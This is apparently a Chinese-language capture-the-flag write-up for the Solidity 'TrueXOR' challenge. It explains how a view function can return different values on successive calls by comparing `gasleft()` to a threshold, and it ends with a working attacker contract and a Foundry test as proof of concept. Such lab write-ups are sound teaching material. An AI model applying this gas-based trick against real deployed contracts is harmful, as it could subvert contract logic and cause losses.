## TrueXOR

### 目标

成功调用 `ctf` 函数, 函数参数 `target` 是你部署的合约地址, 且实现了 `IBoolGiver` 接口。

### 分析

在 `ctf` 函数中

```solidity
function ctf(address target) external view returns (bool) {
  bool p = IBoolGiver(target).giveBool();
  bool q = IBoolGiver(target).giveBool();
  require((p && q) != (p || q), "bad bools");
  require(msg.sender == tx.origin, "bad sender");
  return true;
}
```

在条件中要求 `(p && q) != (p || q)`, 即前后调用 `giveBool()` 应返回不同的布尔值。

注意到 `giveBool` 有 `view` 修饰符, 意味着不能通过全局变量的方式修改。只能读。

唯一变化的是在通过合约调用 `view` 方法时, `gas` 的变化。

可以记录两次调用 `giveBool` 方法的 `gasleft()`

```solidity
function giveBool() external view override returns (bool) {
    uint gasLeft = gasleft();

    console.log(gasLeft); // 1040414411  | 1040408946
    return gasLeft < threshold;
}
```

设置阈值 `threshold` 处于这两个值中间, 例如设置为 `1040412000`

第一次调用时 `gasLeft` 大于 `threshold`, 返回 `false`
第一次调用时 `gasLeft` 小于于 `threshold`, 返回 `true`

### POC

```solidity
contract TrueXORAttacker is IBoolGiver {
    uint public threshold = 1040412000;
    function giveBool() external view override returns (bool) {
        uint gasLeft = gasleft();

        console.log(gasLeft); // 1040414411  | 1040408946
        return gasLeft < threshold;
    }
}

contract TrueXORTest is Test {
    TrueXOR public trueXOR;
    TrueXORAttacker public trueXORAttacker;
    address public deployer;

    function setUp() public {
        deployer = vm.addr(1);
        vm.startPrank(deployer);

        trueXOR = new TrueXOR();
        trueXORAttacker = new TrueXORAttacker();

        vm.stopPrank();
    }

    function testCallCTF() public {
        vm.startPrank(deployer, deployer);
        bool res = trueXOR.ctf(address(trueXORAttacker));

        assertEq(res, true);

        vm.stopPrank();
    }
}
```
